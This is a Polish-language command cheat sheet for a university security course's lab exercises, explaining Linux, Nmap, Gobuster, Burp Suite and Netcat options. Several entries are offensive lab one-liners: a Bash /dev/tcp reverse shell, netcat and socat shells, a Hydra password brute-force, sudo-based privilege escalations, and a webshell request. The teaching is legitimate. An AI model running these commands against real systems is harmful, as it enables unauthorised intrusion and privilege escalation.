---
title: Spis komend - ćwiczenia 1-7
description: "Komendy z rozwiązań i PDF-ów BSI: krótkie objaśnienia, znaczenie opcji, składnia powłoki i narzędzia Burp Suite."
updated: 2026-11-15
order: 11
---

## Jak czytać tę ściągę

Zestawienie obejmuje polecenia użyte w 14 rozwiązaniach Markdown oraz komendy przedstawione w 14 PDF-ach do **ćwiczeń 1-7**, włącznie z PENTEST. Powtarzające się polecenia zebrano w jednym miejscu. Numer ćwiczenia przy grupie pomaga wrócić do kontekstu.

W przykładach `ADRES`, `PORT`, `PLIK` i `UZYTKOWNIK` to wartości do zastąpienia. Polecenia laboratoryjne z konkretnymi adresami znajdziesz w [rozwiązaniach](/przedmioty/bsi/bsi-rozwiazania/), a ich szersze wyjaśnienie w [przygotowaniu do kolokwium](/przedmioty/bsi/bsi-kolokwium-1/).

**Duże i małe litery w opcjach mają znaczenie.** `-p` w SSH ustawia port, `-P` w Hydrze wskazuje słownik haseł, a `-p` w Bash włącza inny mechanizm. Opcję zawsze czytaj razem z nazwą programu.

## Terminal, pliki i wyszukiwanie

### Podstawowa obsługa - ćwiczenie 1

- `pwd` - wyświetla bieżący katalog; przydatne uzupełnienie do orientacji przed kopiowaniem i uruchamianiem serwerów.
- `cd KATALOG` - przechodzi do katalogu; `cd ..` poziom wyżej, `cd ~` do katalogu domowego. W PDF pojawia się przy obsłudze autouzupełniania.
- `ls` - wypisuje zawartość katalogu.
- `ls -l` - dodaje uprawnienia, właściciela, grupę, rozmiar i czas modyfikacji.
- `ls -a` - pokazuje również nazwy zaczynające się od kropki; `ls -la` łączy obie opcje.
- `cat PLIK` - wypisuje zawartość pliku; przy kilku plikach łączy ich treść na wyjściu. Nie jest edytorem.
- `echo TEKST` - wypisuje tekst. `echo $USER` wypisuje wartość zmiennej `USER`; samo `echo` wysyła znak nowej linii.
- `touch PLIK` - tworzy pusty plik, jeżeli go nie ma; dla istniejącego aktualizuje znaczniki czasu.
- `cp ZRODLO CEL` - kopiuje plik. `cp /etc/passwd ~` zapisuje kopię w katalogu domowym.
- `mv ZRODLO CEL` - przenosi albo zmienia nazwę pliku.
- `rm PLIK` - usuwa plik.
- `mkdir KATALOG` - tworzy katalog. `mkdir -p SCIEZKA` tworzy też brakujące katalogi nadrzędne i akceptuje istniejący katalog.
- `rmdir KATALOG` - usuwa pusty katalog.
- `chmod 600 PLIK` - ustawia odczyt i zapis tylko dla właściciela; stosowane do klucza prywatnego SSH w 5.4p.
- `chmod 700 KATALOG` - daje właścicielowi odczyt, zapis i przechodzenie przez katalog; przykład dla `.ssh` w PDF 1.
- `chmod u+s PLIK` - ustawia bit SUID; w PDF 7 wyjaśnia mechanizm plików uruchamianych z efektywnym UID właściciela.
- `man POLECENIE` - otwiera podręcznik, np. `man nmap`; wyjście zwykle klawiszem `q`.
- `clear` - czyści widok terminala.
- `history` - pokazuje historię poleceń. `!!` przywołuje ostatnie polecenie, a `!nazwa` ostatnie zaczynające się od podanego tekstu.
- `exit` - zamyka bieżącą powłokę lub sesję klienta; po zdalnym SSH wraca do wcześniejszej maszyny.

### Szukanie nazw i treści - ćwiczenia 1 i 7

- `locate NAZWA` - szuka ścieżek w indeksie plików; szybko, ale indeks może nie zawierać najnowszych zmian. Przykłady: `locate FINDME`, `locate smbserver.py`.
- `find / -name '*.conf'` - przeszukuje drzewo od `/`, szukając nazw pasujących do wzorca. Apostrofy chronią `*` przed rozwinięciem przez bieżącą powłokę.
- `grep WZORZEC PLIK` - wypisuje linie pasujące do wzorca, np. `grep solution WORDS`.
- `grep -v nologin /etc/passwd` - odwraca dopasowanie: pokazuje linie bez `nologin`. Taki filtr sam nie dowodzi, że każde pokazane konto pozwala się zalogować.
- `sed -i s/root:x/root:/ ./passwd` - w ćwiczeniu 7.11 zmienia `root:x` na `root:` w **lokalnej kopii** `passwd`; `-i` zapisuje zmianę bezpośrednio w tym pliku.
- `sha1sum PLIK` - oblicza sumę SHA-1 pliku; służy do sprawdzenia transferu i porównania binariów z systemem odniesienia.

```bash
find / -type f -perm /6000 -exec sha1sum {} \; 2>/dev/null
```

W tym poleceniu:

- `/` - początek przeszukiwania: katalog główny.
- `-type f` - tylko zwykłe pliki.
- `-perm /6000` - dowolny z bitów SUID (`4000`) lub SGID (`2000`); nie wymaga obu naraz.
- `-exec sha1sum {} \;` - dla każdego wyniku uruchamia `sha1sum`; `{}` jest ścieżką znalezionego pliku, a `\;` kończy wyrażenie `-exec`.
- `2>/dev/null` - ukrywa standardowe komunikaty błędów, np. brak dostępu.

Bez fragmentu `-exec ...` otrzymujesz samą listę podejrzanych ścieżek. Znalezienie SUID lub innej sumy to początek analizy, nie potwierdzenie podatności.

## Użytkownicy, system i zasoby

### Użytkownicy i procesy - ćwiczenia 1 i 7

- `whoami` - podaje nazwę użytkownika odpowiadającą efektywnemu UID procesu.
- `id` - pokazuje UID, GID i grupy bieżącego użytkownika; `id UZYTKOWNIK` odczytuje dane wskazanego konta.
- `env` - wypisuje zmienne środowiskowe.
- `who` - pokazuje aktualnie zalogowane sesje użytkowników.
- `last` - pokazuje historię logowań z dostępnego dziennika.
- `ps` - pokazuje wybrane procesy; bez opcji zwykle procesy związane z bieżącą sesją, a nie wszystkie w systemie.
- `ps aux` - szeroki przegląd procesów, ich użytkowników, zużycia CPU i pamięci oraz wierszy poleceń. To składnia bez myślnika przed `aux`.
- `ps auxf` - dodatkowo przedstawia relacje procesów jako drzewo.
- `top` - odświeżany na żywo widok procesów i zasobów; wyjście `q` lub przerwanie zgodnie z zadaniem.
- `sleep 31337` - wstrzymuje proces na podaną liczbę sekund; w 1.9 pojawia się w wierszu obserwowanego procesu.
- `sh -c 'POLECENIE'` - uruchamia tekst jako polecenie interpretera `sh`; także widoczne w wyniku 1.9.

### System, pamięć i sprzęt - ćwiczenie 1

- `uname -a` - pokazuje informacje o jądrze, hoście i architekturze; wersję dystrybucji sprawdzaj osobno.
- `cat /etc/os-release` - odczytuje nazwę i wersję dystrybucji.
- `cat /etc/issue` - pokazuje komunikat wyświetlany przed logowaniem; może zawierać nazwę systemu.
- `cat /proc/version` - pokazuje informacje o wersji i kompilacji jądra.
- `cat /proc/cpuinfo` - pokazuje dane procesora, m.in. model i `vendor_id`.
- `cat /proc/meminfo` - pokazuje szczegółowe statystyki pamięci.
- `lspci` - wypisuje urządzenia PCI, np. kontrolery sieciowe i dyskowe.
- `lsusb` - wypisuje urządzenia USB.
- `lsscsi` - pokazuje urządzenia SCSI.
- `lshw` - zbiera szczegółowe informacje o sprzęcie; pełny wynik może wymagać wyższych uprawnień.
- `lsblk` - pokazuje urządzenia blokowe, partycje i punkty montowania.
- `df -h` - pokazuje rozmiar i zajętość zamontowanych systemów plików; `-h` dobiera czytelne jednostki.
- `free -h` - pokazuje użycie RAM i swap w czytelnych jednostkach. To pamięć, nie miejsce na dysku.

### Sieć lokalnej maszyny - ćwiczenia 1, 6 i 7

- `ip a` lub `ip addr show` - wyświetla interfejsy i ich adresy.
- `ip addr show tun0` - ogranicza wynik do interfejsu VPN `tun0`; szukaj własnego adresu przy `inet`, nie adresu `peer`.
- `ip r` - pokazuje tablicę routingu; `default via` wskazuje domyślną bramę.
- `ip n` - pokazuje tablicę sąsiadów, np. odwzorowania IPv4-MAC z ARP.
- `cat /etc/resolv.conf` - odczytuje konfigurację używanych serwerów DNS.
- `ss -tp` - pokazuje gniazda TCP i, przy wystarczających uprawnieniach, powiązane procesy.
- `ss -tlp` - dodaje ograniczenie do gniazd nasłuchujących.
- `ss -tlpn` - to samo z liczbowymi adresami i portami: `-t` TCP, `-l` nasłuch, `-p` proces, `-n` bez zamiany numerów na nazwy.

`127.0.0.1` i inne adresy IPv4 z `127.0.0.0/8` wskazują loopback danej maszyny. `0.0.0.0` użyte jako adres nasłuchu oznacza wszystkie lokalne interfejsy IPv4; nie jest konkretnym adresem hosta, do którego masz się połączyć.

## Instalacja, usługi i harmonogram

### Pakiety i pomoc - ćwiczenia 1, 4 i 5

- `sudo apt update` - odświeża informacje o dostępnych pakietach; samo nie aktualizuje zainstalowanych programów.
- `sudo apt install PAKIET` - instaluje pakiet, np. `seclists`, `apache2`, `python3-pyftpdlib`, `python3-impacket`, `openssh-server`.
- `sudo apt upgrade` - aktualizuje pakiety bez usuwania zainstalowanych pakietów; `apt` może doinstalować potrzebne zależności.
- `sudo apt full-upgrade` - rozwiązuje zmiany zależności i może usuwać pakiety, gdy jest to potrzebne do aktualizacji. W materiałach wymieniono także `dist-upgrade`.
- `sudo apt autoremove` - usuwa automatycznie zainstalowane zależności, które nie są już potrzebne.
- `apt list --upgradable` - pokazuje dostępne aktualizacje.
- `sudo apt clean` - usuwa pobrane archiwa pakietów z pamięci podręcznej.
- `git clone ADRES_REPO` - pobiera repozytorium Git; w 4 używane jako alternatywny sposób pobrania SecLists.
- `PROGRAM --help` lub `PROGRAM -h` - zwykle wyświetla skróconą pomoc; dokładna opcja zależy od programu.

### Systemd, Apache i cron - ćwiczenia 1 i 5

- `systemctl status USLUGA` - pokazuje stan wskazanej usługi, np. `ssh` albo `SOLUTION`.
- `systemctl status` - bez nazwy pokazuje ogólny stan systemu i jednostek.
- `sudo systemctl start apache2` - uruchamia Apache; analogicznie `start ssh` uruchamia usługę SSH.
- `sudo systemctl restart apache2` - zatrzymuje i ponownie uruchamia Apache, np. po włączeniu konfiguracji HTTPS.
- `sudo a2enmod ssl` - włącza moduł SSL/TLS w Apache na systemach z tą strukturą konfiguracji.
- `sudo a2ensite default-ssl.conf` - włącza konfigurację witryny HTTPS; sama komenda nie restartuje serwera.
- `cat /etc/crontab` - odczytuje systemowy harmonogram cron; wpisy mogą zawierać nazwę użytkownika wykonującego zadanie.
- `crontab -e` - otwiera edycję osobistego crontaba bieżącego użytkownika.
- `crontab -l` - odczytuje osobisty crontab bez edycji; uzupełnienie przydatne do zadania 1.15.
- `@reboot POLECENIE` - wpis harmonogramu cron uruchamiający polecenie przy starcie demona; to składnia crontaba, nie samodzielna komenda w terminalu.

## SSH, uprawnienia i przenoszenie plików

### Logowanie i klucze - ćwiczenia 1, 2, 5 i 7

- `ssh UZYTKOWNIK@ADRES` - otwiera szyfrowaną sesję zdalną; domyślnie port TCP 22.
- `ssh UZYTKOWNIK@ADRES -p PORT` - wybiera niestandardowy port SSH.
- `ssh -i KLUCZ UZYTKOWNIK@ADRES` - używa wskazanego klucza prywatnego do uwierzytelnienia.
- `ssh-keygen` - generuje parę kluczy; nazwy plików zależą od typu i wybranej ścieżki.
- `ssh-copy-id UZYTKOWNIK@ADRES` - dodaje klucz publiczny do autoryzowanych kluczy konta na serwerze.
- `scp PLIK UZYTKOWNIK@ADRES:/SCIEZKA` - kopiuje lokalny plik na zdalny host przez SSH.
- `scp UZYTKOWNIK@ADRES:/SCIEZKA/PLIK .` - kopiuje plik ze zdalnej maszyny do bieżącego katalogu; wariant objaśniający kierunek transferu.
- `sudo POLECENIE` - wykonuje polecenie jako inny użytkownik, zwykle root, w zakresie dopuszczonym konfiguracją sudo.
- `sudo -l` - pokazuje reguły sudo dostępne dla bieżącego użytkownika; nie podnosi samo uprawnień powłoki.
- `su` - próbuje przełączyć na root; zwykle wymaga hasła konta docelowego.
- `su backup` - próbuje przełączyć na użytkownika `backup`.
- `sudo su` - uruchamia `su` przez sudo; w scenariuszach z odpowiednimi regułami daje powłokę roota.

`authorized_keys` zawiera **klucze publiczne dopuszczone do logowania**, a plik `id_ed25519` lub `id_rsa` jest kluczem **prywatnym klienta**. Sama znajomość klucza publicznego nie wystarcza do zalogowania się.

### Pobieranie i archiwa - ćwiczenia 2, 5 i 7

- `curl URL` - pobiera zasób i domyślnie wypisuje treść na standardowe wyjście, np. do terminala.
- `curl URL -o PLIK` - zapisuje pobraną treść w pliku; ten wariant pojawia się w PDF 7.
- `curl file:///SCIEZKA/PLIK` - odczytuje plik lokalny przez schemat `file://`; w ćwiczeniu 7 PDF używa tego z uprawnieniami sudo i plikiem wyjściowym.
- `wget URL` - pobiera zasób do pliku.
- `wget -r --no-parent URL` - rekursywnie pobiera odkrywane zasoby, bez wychodzenia do katalogów nadrzędnych. Nie gwarantuje odkrycia plików, do których nie ma linków.
- `wget URL -O PLIK` - zapisuje treść do wskazanego pliku; może nadpisać istniejącą zawartość.
- `wget -O - URL` - wypisuje treść na standardowe wyjście.
- `wget URL -o LOG` - zapisuje **dziennik programu**, a nie pobierany dokument. Nie myl z dużym `-O`.
- `tar zxvf ARCHIWUM.tar.gz` - rozpakowuje archiwum: `z` gzip, `x` rozpakowanie, `v` wypisywanie nazw, `f` plik archiwum.
- `tar -cf ARCHIWUM.tar ...` - tworzy archiwum: `c` tworzenie, `f` nazwa pliku. PDF 7 wspomina też `--checkpoint` i `--checkpoint-action=exec=...`, czyli możliwość wykonania programu w punkcie kontrolnym; to przykład ryzyka nadmiernych uprawnień do rozbudowanego narzędzia.

### Klienci FTP i SMB - ćwiczenie 2 PENTEST

- `ftp ADRES` - otwiera interaktywnego klienta FTP. `anonymous` to nazwa konta wpisywana w pytaniu o login.
- `smbclient -N -L //ADRES/` - listuje udziały SMB; `-N` nie pyta o hasło, `-L` prosi o listę udziałów. Serwer nadal musi dopuszczać taki dostęp.
- `smbclient -N //ADRES/UDZIAL` - otwiera wskazany udział SMB bez pytania o hasło.
- `dir` lub `ls` **wewnątrz klienta** - listuje pliki na zdalnym serwerze; dostępne nazwy poleceń zależą od klienta.
- `get PLIK` **wewnątrz klienta** - pobiera zdalny plik do lokalnego katalogu klienta.
- `exit` **wewnątrz klienta** - kończy pracę FTP/SMB. Następujące po nim `cat PLIK` wpisujesz już w zwykłej powłoce.

## Nmap - enumeracja sieci

### Najważniejsze opcje - ćwiczenia 2, 5 i 7

- `nmap ADRES` - skanuje domyślny zestaw popularnych portów; nie wszystkie 65 535.
- `nmap -h` - pokazuje pomoc z opcjami programu.
- `-sn` - odkrywa aktywne hosty, wyłączając skanowanie portów.
- `-sT` - skan TCP connect: próbuje zestawić pełne połączenie TCP.
- `-sS` - skan SYN, przedstawiony w PDF; wymaga możliwości wysyłania odpowiednich surowych pakietów.
- `-sV` - wykrywa usługę i jej wersję na podstawie odpowiedzi na sondy.
- `-sC` - uruchamia domyślny zestaw skryptów NSE; nie oznacza wszystkich skryptów ani pełnego audytu podatności.
- `-O` - próbuje rozpoznać system operacyjny na podstawie zachowania stosu sieciowego.
- `--osscan-guess` - pozwala Nmapowi bardziej agresywnie zgadywać system przy niejednoznacznym dopasowaniu.
- `-A` - włącza wykrywanie OS, wersji, domyślne skrypty i traceroute. Nie zastępuje `-p-`. [Dokumentacja Nmap](https://nmap.org/book/man-misc-options.html).
- `-p-` - w typowym skanie TCP obejmuje porty 1-65535; nie włącza samo skanowania UDP.
- `-n` - wyłącza rozwiązywanie nazw DNS.
- `-Pn` - pomija etap ustalania, czy host jest aktywny, i próbuje skanowania wskazanych celów. Nie otwiera portów i nie omija zapory. [Dokumentacja odkrywania hostów](https://nmap.org/book/man-host-discovery.html).
- `-vv` - zwiększa szczegółowość komunikatów o postępie i wynikach.
- `./nmap` - uruchamia plik `nmap` z bieżącego katalogu, np. statyczny program przeniesiony na maszynę bez Internetu.

```bash
nmap -sn 10.13.37.0/24
```

To odkrywanie hostów w zakresie `/24`, a nie pełny skan ich usług.

```bash
./nmap -n -Pn -sV -p- -vv ADRES
```

To skan wszystkich standardowych portów TCP wskazanego celu, z rozpoznawaniem wersji, bez DNS i bez wstępnego odrzucania celu na podstawie host discovery. W PENTEST skan wykonujesz z maszyny, która ma trasę do sieci wewnętrznej.

## WWW - enumeracja i formularze

### Gobuster i FFUF - ćwiczenie 4

- `gobuster dir` - sprawdza ścieżki katalogów i plików HTTP według słownika.
- `gobuster vhost` - testuje nazwy wirtualnych hostów serwera WWW; zmienia nazwę wysyłaną w żądaniu.
- `gobuster fuzz` - wstawia elementy słownika w miejsce `FUZZ`, np. w parametrze `password`.
- `-u URL` - adres testowanego zasobu.
- `-w SLOWNIK` - plik ze słowami do testowania.
- `-r` - w użyciu Gobustera z materiałów śledzi przekierowania HTTP.
- `--domain NAZWA` - domena używana w trybie vhost.
- `--append-domain` - dopisuje domenę do słowa ze słownika, np. `beta` → `beta.developer`.
- `-k` - pomija weryfikację certyfikatu HTTPS; nie wyłącza szyfrowania transmisji.
- `--exclude-length 334` - odrzuca odpowiedzi o podanej długości; liczba `334` pochodzi z rozwiązania i zależy od instancji.
- `ffuf -w SLOWNIK -u 'http://ADRES/FUZZ'` - alternatywny fuzzing ścieżek z PDF; `FUZZ` określa miejsce podstawienia.
- `ffuf ... -H 'Host: FUZZ'` - testuje nagłówek `Host`, czyli wariant enumeracji vhostów.
- `ffuf ... -H 'Host: FUZZ.domena'` - testuje prefiksy subdomen obsługiwanych przez serwer.
- `ffuf ... -fs ROZMIAR` - filtruje odpowiedzi o wskazanej liczbie bajtów.

`SecLists` jest kolekcją słowników, nie skanerem. Listę katalogów dobierz do katalogów, listę plików do plików, listę DNS do nazw hostów, a listę haseł do formularza.

### Hosts i Hydra - ćwiczenie 4 PENTEST

```bash
echo '192.168.100.154 developer' | sudo tee -a /etc/hosts
```

`tee` czyta wejście, wypisuje je na ekran i zapisuje do pliku; `-a` dopisuje. Uruchomienie `tee` przez sudo daje uprawnienia do zapisu w `/etc/hosts`. Wpis mapuje nazwę na IP **na tej maszynie**; nie tworzy publicznego rekordu DNS.

Hydra wykonuje serię prób uwierzytelnienia. W rozwiązaniu:

```bash
hydra -l anything -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt 'https-post-form://beta.developer/admin/index_admin.php:p=^PASS^:Wrong password'
```

- `-l anything` - jedna nazwa użytkownika; w tym formularzu wartość nie ma znaczenia.
- `-P ...` - plik kandydatów na hasło.
- `https-post-form` - moduł formularza HTTP POST po HTTPS.
- `beta.developer/admin/index_admin.php` - host i ścieżka formularza.
- `p=^PASS^` - treść formularza; `^PASS^` zostanie zastąpione kandydatem ze słownika.
- `Wrong password` - tekst rozpoznający nieudaną próbę w odpowiedzi tego formularza.

Sukces trzeba sprawdzić rzeczywistym logowaniem: niewłaściwy tekst błędu lub nietypowe przekierowanie może dawać błędne wskazania.

## Transfer i uruchamianie serwerów

### Netcat - ćwiczenia 5 i 6

`nc` to Netcat: przekazuje bajty między siecią a wejściem/wyjściem programu.

- `nc ADRES PORT` - inicjuje połączenie TCP.
- `nc -u ADRES PORT` - używa UDP.
- `nc -lvp PORT` - w odmianie z materiałów nasłuchuje: `-l` listen, `-v` komunikaty diagnostyczne, `-p` wskazany port.
- `nc -luvp PORT` lub `nc -ulvp PORT` - analogiczny nasłuch UDP; kolejność tych krótkich opcji w źródłach jest różna.
- `-w 5` lub `-w 30` - limit oczekiwania lub bezczynności; szczegółowe działanie w trybie listen zależy od odmiany Netcata.
- `-e /bin/bash` - łączy gniazdo z uruchomioną powłoką Bash; ta opcja nie występuje w każdej wersji `nc`.

```bash
nc ADRES PORT > pobrane.png
cat wysylane.png | nc ADRES PORT
```

Pierwsza linia zapisuje **odebrane** dane. Druga przekazuje zawartość pliku do sieci. Wariant `-l` zmienia stronę inicjującą połączenie, ale nie odwraca znaczenia `>` ani `|`.

### Proste serwery - ćwiczenie 5

- `python3 -m http.server 80` - uruchamia serwer HTTP na porcie 80, udostępniając bieżący katalog. `-m` oznacza uruchomienie modułu Pythona.
- `python3 -m http.server 1234` - ten sam mechanizm na innym porcie, użyty do przeniesienia linPEAS w 7.4p.
- `sudo python3 -m pyftpdlib -p 21` - uruchamia serwer FTP z biblioteki pyftpdlib na porcie 21.
- `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 0.0.0.0 -smb2support pjatksmbshare "$HOME"` - uruchamia udział SMB: `-ip` adres nasłuchu, `-smb2support` obsługa SMB2, `pjatksmbshare` nazwa udziału, `"$HOME"` udostępniany katalog.
- `sudo systemctl start ssh` - uruchamia serwer SSH, z którego korzysta kopiowanie przez `scp`.

Ścieżka `smbserver.py` i sposób uruchomienia zależą od instalacji. Porty 80, 21 i 445 mogą wymagać odpowiednich uprawnień. Dwa serwery nie mogą jednocześnie zająć tego samego adresu i portu w ten sam sposób.

## Zdalne powłoki i interaktywność

### Bash i socat - ćwiczenie 6

- `bash PLIK.sh` - uruchamia skrypt w Bash, np. `bash linpeas.sh`.
- `bash -i` - uruchamia powłokę interaktywną; samo `-i` nie przydziela pseudoterminala.
- `bash -p` - zachowuje zastane efektywne uprawnienia w odpowiednim kontekście; nie nadaje samodzielnie UID 0.
- `tty` - pokazuje urządzenie terminala; w przykładach socat wynik jest podstawiany przez zapis w backtickach.
- `socat ADRES1 ADRES2` - przekazuje dane między dwoma opisanymi końcami, np. terminalem, gniazdem sieciowym lub procesem.
- `tcp-connect:ADRES:PORT` lub `TCP:ADRES:PORT` - sieciowy koniec inicjujący połączenie TCP.
- `tcp-listen:PORT` lub `TCP-LISTEN:PORT` - sieciowy koniec nasłuchujący.
- `FILE:` z nazwą urządzenia terminala - przyłącza lokalny terminal.
- `raw,echo=0` - surowa obsługa terminala i wyłączone lokalne echo.
- `EXEC:/bin/bash` - uruchamia Bash i łączy go z drugim końcem socat.
- `pty` - przydziela pseudoterminal; poprawia działanie programów interaktywnych.
- `stderr` - dołącza standardowy strumień błędów procesu.
- `setsid` - uruchamia proces w nowej sesji.
- `sigint` - umożliwia przekazywanie sygnału przerwania do podłączonego procesu.
- `sane` - ustawia rozsądne domyślne parametry terminala.
- `reuseaddr` - pozwala ponownie użyć lokalnego adresu zgodnie z regułami gniazd.
- `fork` - obsługuje kolejne połączenia w procesach potomnych.
- `socat -u ...` - przekazuje dane jednokierunkowo; taki wariant pojawia się przy transferze plików w PDF 5.
- `open:PLIK,creat` - otwiera plik do zapisu i tworzy go, jeśli nie istnieje.

```bash
bash -i >& /dev/tcp/ADRES/PORT 0>&1
```

To laboratoryjny reverse shell z 6.3. `/dev/tcp/...` jest specjalną składnią obsługiwaną przez Bash, a nie zwykłym plikiem dyskowym. `>&` kieruje wyjście i błędy do połączenia, a `0>&1` przyłącza również wejście do tego samego połączenia.

### Uzupełnienie interaktywności z PDF 6, s. 35

- `python3 -c "import pty;pty.spawn('bash')"` - uruchamia Bash w pseudoterminalu; `-c` wykonuje podany fragment kodu Pythona.
- `stty -echo raw` - ustawia lokalny terminal w trybie raw i wyłącza echo.
- `fg` - wznawia zadanie na pierwszym planie.
- `bg` - wznawia zadanie w tle.
- `export TERM=xterm-256color` - ustawia i udostępnia procesom potomnym typ terminala.
- `source /etc/skel/.bashrc` - wczytuje wskazany skrypt konfiguracji w bieżącej powłoce.
- `stty rows 100 cols 100` - ustawia zadeklarowany rozmiar terminala; liczby należy dopasować.
- `stty -a` - pokazuje parametry terminala, w tym liczbę wierszy i kolumn.

W sekwencji ze slajdów najpierw tworzysz PTY zdalnie, następnie `Ctrl+Z` wraca do lokalnej powłoki, a `stty -echo raw ; fg` zmienia lokalny terminal i wznawia połączenie. Rozróżnienie miejsca wykonania jest tu kluczowe.

## Analiza uprawnień i tylne furtki

### Narzędzia z ćwiczenia 7

- `bash linpeas.sh` - uruchamia linPEAS, który zbiera informacje pomocne przy szukaniu dróg eskalacji. Raport wymaga ręcznej oceny.
- `bash linpeas.sh -P HASLO` - wariant z PDF pozwalający wykonać dodatkowe kontrole z podanym hasłem; nie jest poleceniem zmiany hasła.
- `sudo /usr/bin/perl -e 'system("/root/solve");'` - w 7.8 uruchamia Perl przez sudo; `-e` wykonuje podany kod, a `system(...)` uruchamia program laboratoryjny.
- `sudo /usr/bin/python3 -c "import os;os.system('/root/solve')"` - odpowiednik pokazany w PDF 7 dla reguły dopuszczającej Python.
- `sudo vi` lub `sudo vim` - uruchamia edytor z uprawnieniami przyznanymi przez sudo.
- `:!bash` - polecenie wpisywane **w edytorze vi/vim**, które uruchamia zewnętrzną powłokę; dziedziczy kontekst uprawnień edytora.
- `sudo service ../../bin/bash` - wariant z PDF 7p, wykorzystujący konkretną regułę sudo i zachowanie `service` w laboratorium.
- `/root/solve` - program służący zaliczeniu zadania w ćwiczeniu 7. Nie jest standardową komendą Linuxa.
- `./.zsh_history`, `/usr/sbin/delete`, `/usr/bin/chfn` - ścieżki plików uruchamianych jako furtki w rozwiązaniach 7.4, 7.5 i 7.7. Nie zakładaj, że plik o tej nazwie w innym systemie ma takie samo działanie.

`GTFOBins` to katalog sposobów nadużycia funkcji zwykłych programów w określonych warunkach uprawnień. Nie jest komendą ani dowodem, że każde opisane narzędzie jest podatne w każdej konfiguracji.

## WWW bez środowiska graficznego i Burp Suite

### Lynx i webshell - ćwiczenie 6 PENTEST

- `lynx ADRES` - otwiera stronę w tekstowej przeglądarce; wyjście zwykle `q`.
- `curl 'http://ADRES/cmd.php?c=id%20webadmin'` - wysyła parametr do webshella z repozytorium. Dopiero aplikacja na serwerze interpretuje go jako polecenie `id webadmin`.
- `%20` - zapis spacji w kodowaniu procentowym URL.
- `+` - może reprezentować spację w danych formularzowych, jak w pokazanym webshellu; literalny plus koduje się jako `%2B`.

`GET`, `POST`, `Cookie:` i `Host:` są elementami HTTP. **Nie są poleceniami Bash.** Podobnie `[ANSWER]`, `uid=...` z przykładowego wyniku `id` czy nazwa `root` podana jako odpowiedź w zadaniu nie tworzą osobnych komend systemowych.

### Operacje w Burp Suite - ćwiczenie 3

- **HTTP history** - przegląd już zarejestrowanych żądań i odpowiedzi.
- **Intercept on/off** - włącza lub wyłącza zatrzymywanie żądań do ręcznej edycji.
- **Forward** - przekazuje zatrzymane żądanie dalej.
- **Send to Repeater → Send** - pozwala ręcznie zmieniać i powtarzać konkretne żądanie.
- **Send to Intruder** - przygotowuje serię powtórzeń lub modyfikacji żądania.
- **Clear § / Add §** - usuwa lub dodaje pozycje podstawiania payloadów.
- **Null payloads** - umożliwia powtarzanie żądania bez zmiany wartości.
- **Numbers, 1-50, step 1** - generuje identyfikatory od 1 do 50.
- **Start attack** - rozpoczyna serię żądań według konfiguracji Intrudera.
- **Decoder → Decode as → Base64** - zamienia reprezentację Base64 z powrotem na bajty lub tekst.
- **Deobfuscate** - operacja w zewnętrznym narzędziu z zadania; upraszcza zaciemniony JavaScript.

## Składnia powłoki i skróty

### Znaki, które zmieniają działanie polecenia

- `# komentarz` - komentarz powłoki poza cudzysłowem; reszta linii nie jest wykonywana.
- `~` - katalog domowy użytkownika; `"$HOME"` odczytuje ścieżkę ze zmiennej środowiskowej.
- `.` - bieżący katalog; `./program` wskazuje plik programu w tym katalogu.
- `>` - zapisuje standardowe wyjście do pliku, tworząc go lub nadpisując.
- `>>` - dopisuje standardowe wyjście na końcu pliku.
- `|` - przekazuje standardowe wyjście jednego programu na wejście kolejnego; nie dołącza automatycznie błędów.
- `2>` - przekierowuje błędy. `2>/dev/null` je odrzuca.
- `&&` - wykonuje kolejne polecenie tylko po powodzeniu poprzedniego, np. `apt update && apt install apache2`.
- `;` - oddziela polecenia wykonywane kolejno, bez sprawdzania sukcesu pierwszego.
- `$(polecenie)` i zapis w backtickach - podstawiają wynik wykonania polecenia. W `echo "... $(cat PLIK) ..."` plik jest odczytywany już przy wykonywaniu `echo`.
- `'tekst'` - chroni dosłowną treść przed rozwijaniem zmiennych i podstawianiem poleceń.
- `"tekst"` - chroni spacje, ale pozwala na rozwinięcie `$USER`, `$HOME` i `$(...)`.
- `*` - wzorzec nazw plików w powłoce; w wyrażeniu crona oznacza wszystkie wartości danego pola. Znaczenie zależy od miejsca użycia.

### Skróty klawiaturowe z materiałów

- `Tab` - uzupełnia nazwę; podwójny `Tab` zwykle pokazuje możliwości.
- `Ctrl+A` / `Ctrl+E` - początek / koniec wiersza.
- `Ctrl+F` / `Ctrl+B` - znak do przodu / do tyłu.
- `Alt+F` / `Alt+B` - słowo do przodu / do tyłu.
- `Ctrl+U` / `Ctrl+K` - usuwa tekst do początku / końca wiersza.
- `Ctrl+W` / `Ctrl+Y` - usuwa poprzednie słowo / wstawia wcześniej usunięty tekst.
- `Ctrl+C` - zwykle wysyła SIGINT do procesu na pierwszym planie.
- `Ctrl+Z` - zwykle zawiesza proces; `fg` lub `bg` może go wznowić.
- `Ctrl+D` - sygnalizuje koniec wejścia; w pustym wierszu powłoki zwykle kończy sesję.
- `Ctrl+L` - czyści widok terminala.
- `Ctrl+R` - przeszukuje historię; ponowne naciśnięcie szuka starszego dopasowania.
- `↑` / `↓` - poprzednie / kolejne polecenie historii.
- `Ctrl+Shift+C` / `Ctrl+Shift+V` - kopiowanie / wklejanie w typowych terminalach graficznych.
- `Ctrl++` / `Ctrl+-` - zmiana rozmiaru tekstu w terminalu graficznym, zależnie od aplikacji.

## Nazwy narzędzi wspomniane w teorii

PDF-y wymieniają również narzędzia, dla których nie podają pełnej sekwencji użycia. Warto rozpoznawać ich przeznaczenie:

- **Masscan, Zmap, Unicornscan, RustScan** - alternatywy do odkrywania hostów i portów; RustScan może współpracować z Nmapem.
- **Test-NetConnection, Get-NetTCPConnection, Get-NetIPAddress** - polecenia PowerShell do diagnozy połączeń, gniazd i adresów.
- **SharpHound** - zbiera dane o relacjach w Active Directory.
- **Advanced IP Scanner** - odkrywa urządzenia sieciowe.
- **dnsrecon, Fierce, Sublist3r** - zbierają informacje DNS i pomagają odkrywać subdomeny.
- **snmpwalk** - odczytuje udostępniane dane SNMP.
- **Gitwalk, Gitdump** - w materiałach podane jako narzędzia analizy repozytoriów i ujawnionego kodu.
- **DirBuster, DIRB, Wfuzz** - alternatywne narzędzia enumeracji i fuzzingu WWW.
- **ZAP, Fiddler, mitmproxy, Charles Proxy** - narzędzia analizy ruchu aplikacji WWW.
- **Wireshark** - analizuje przechwycone pakiety.
- **Metasploit, Empire** - platformy wykorzystywane w testach bezpieczeństwa, m.in. do obsługi dostępu do systemów.
